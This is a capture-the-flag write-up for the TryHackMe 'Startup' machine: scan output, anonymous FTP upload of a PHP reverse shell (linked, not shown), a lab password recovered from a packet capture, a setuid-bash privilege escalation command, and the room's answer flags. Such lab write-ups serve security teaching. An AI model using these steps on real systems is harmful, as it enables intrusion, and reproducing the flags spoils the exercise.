# Startup

## Nmap

**nmap -A -sV 10.10.253.54**

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-09 20:49 CET
Nmap scan report for 10.10.253.54
Host is up (0.059s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.9.146.46
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.38 seconds
                                                             
```

## FTP

**ftp 10.10.254.54**

User/Password: anonymous

```
Connected to 10.10.253.54.
220 (vsFTPd 3.0.3)
Name (10.10.253.54:samsepi0l): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||61964|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
```

notice.txt:

Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.

important.jpg:

![image](https://github.com/prox11/CTF-Writeups/assets/148764185/896a9187-64c9-4139-914e-4e05248357b4)

## Website

![image](https://github.com/prox11/CTF-Writeups/assets/148764185/10820abe-79e0-4b79-9ed3-bfdb517b75de)

**dirb http://10.10.253.54 /usr/share/wordlist/dirb/big.txt -r**

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Dec  9 20:54:40 2023
URL_BASE: http://10.10.253.54/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://10.10.253.54/ ----
==> DIRECTORY: http://10.10.253.54/files/                                                                                                                
+ http://10.10.253.54/server-status (CODE:403|SIZE:277)                                                                                                  
                                                                                                                                                         
-----------------
END_TIME: Sat Dec  9 21:13:34 2023
DOWNLOADED: 20458 - FOUND: 1
```


![image](https://github.com/prox11/CTF-Writeups/assets/148764185/91ab927a-3e0a-41b7-b545-ea12ac7aad00)

## Uploading shell in FTP

```
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||60868|)
150 Ok to send data.
100% |********************************************************************|  5492       54.55 MiB/s    00:00 ETA
226 Transfer complete.
5492 bytes sent in 00:00 (47.37 KiB/s)
ftp> 

```

shell: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

![image](https://github.com/prox11/CTF-Writeups/assets/148764185/53b188b2-19bb-470a-b62b-19e534863fc0)

![image](https://github.com/prox11/CTF-Writeups/assets/148764185/3f6a3927-f71b-478a-97fe-7d444b766a1f)

![image](https://github.com/prox11/CTF-Writeups/assets/148764185/0f1b6e0c-8504-40f1-bdde-57156dbc0973)

## PrivEsc

```
www-data@startup:/$ cat recipe.txt
cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
www-data@startup:/$ cd incidents
cd incidents
www-data@startup:/incidents$ ls
ls
suspicious.pcapng
www-data@startup:/incidents$ python3 -m http.server 8080
python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 ...
```

![image](https://github.com/prox11/CTF-Writeups/assets/148764185/bdc6afb6-9057-4df4-83da-fe9d3326e2ce)

**wireshark suspicious.pcapng**

No. 45 --> Follow TCP Stream

![image](https://github.com/prox11/CTF-Writeups/assets/148764185/8b90f6a1-f3ad-45a1-bfb9-c9cd0ec6cc4c)

password for user lennie: c4ntg3t3n0ughsp1c3

![image](https://github.com/prox11/CTF-Writeups/assets/148764185/c5211586-f3d2-4939-8822-b02b56f84430)


```
lennie@startup:~$ ls -la
total 24
drwx------ 5 lennie lennie 4096 Dec  9 20:07 .
drwxr-xr-x 3 root   root   4096 Nov 12  2020 ..
drwx------ 2 lennie lennie 4096 Dec  9 20:07 .cache
drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 Documents
drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
lennie@startup:~$ cd scripts
lennie@startup:~/scripts$ ls
planner.sh  startup_list.txt
lennie@startup:~/scripts$ ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 5 lennie lennie 4096 Dec  9 20:07 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Dec  9 20:09 startup_list.txt
lennie@startup:~/scripts$ cat startup_list.txt

lennie@startup:~/scripts$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
lennie@startup:~/scripts$ cat /etc/print.sh
#!/bin/bash
echo "Done!"
lennie@startup:~/scripts$ ls -la /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```

**echo "cp /bin/bash /tmp && chmod +s /tmp/bash" > /etc/print.sh**

**/tmp/bash -p**

![image](https://github.com/prox11/CTF-Writeups/assets/148764185/e84ad986-1bf5-4cd6-9732-6f9b884d3d67)

<details>
    <summary>What is the secret spicy soup recipe?</summary>
  
    love
</details>

<details>
    <summary>What are the contents of user.txt?</summary>
  
    THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
</details>

<details>
    <summary>What are the contents of root.txt?</summary>
  
    THM{f963aaa6a430f210222158ae15c3d76d}
</details>
